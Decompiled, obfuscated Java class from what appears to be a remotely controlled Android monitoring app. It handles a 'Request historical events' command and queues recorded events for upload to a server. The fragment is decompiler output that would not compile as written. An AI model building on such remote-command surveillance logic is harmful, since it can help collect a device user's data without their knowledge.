package com.vvt.remotecommand.processor.misc;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputRequestHistoricalEvents;
import java.util.ArrayList;
import java.util.Collection;

public class k
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public k(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    Object localObject1 = paramRemoteCommand.getParameters();
    boolean bool1 = a;
    if (bool1) {}
    int i = ((ArrayList)localObject1).size();
    if (i == 0)
    {
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    int j = 1;
    Object localObject2 = ((ArrayList)localObject1).subList(j, i);
    Object localObject3 = new java/util/ArrayList;
    ((ArrayList)localObject3).<init>();
    ((ArrayList)localObject3).addAll((Collection)localObject2);
    boolean bool2 = a;
    if (bool2) {}
    localObject2 = null;
    paramc.a(paramRemoteCommand, this, null);
    bool2 = a;
    if (bool2) {}
    localObject2 = h();
    RmtCtrlInputRequestHistoricalEvents localRmtCtrlInputRequestHistoricalEvents = new com/vvt/remotecontrol/input/RmtCtrlInputRequestHistoricalEvents;
    localRmtCtrlInputRequestHistoricalEvents.<init>();
    int k = Integer.parseInt((String)((ArrayList)localObject1).get(0));
    localRmtCtrlInputRequestHistoricalEvents.setTotalNumber(k);
    localRmtCtrlInputRequestHistoricalEvents.setSettingIds((ArrayList)localObject3);
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    localObject3 = RemoteFunction.REQUEST_HISTORICAL_EVENTS;
    ((ControlCommand)localObject1).<init>((RemoteFunction)localObject3, localRmtCtrlInputRequestHistoricalEvents);
    boolean bool3 = a;
    if (bool3) {}
    ((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
    if (paramc != null)
    {
      localObject1 = "Events are being sent to the server";
      paramc.b(paramRemoteCommand, this, (String)localObject1);
    }
    boolean bool4 = a;
    if (bool4) {}
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Request historical events";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/k.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */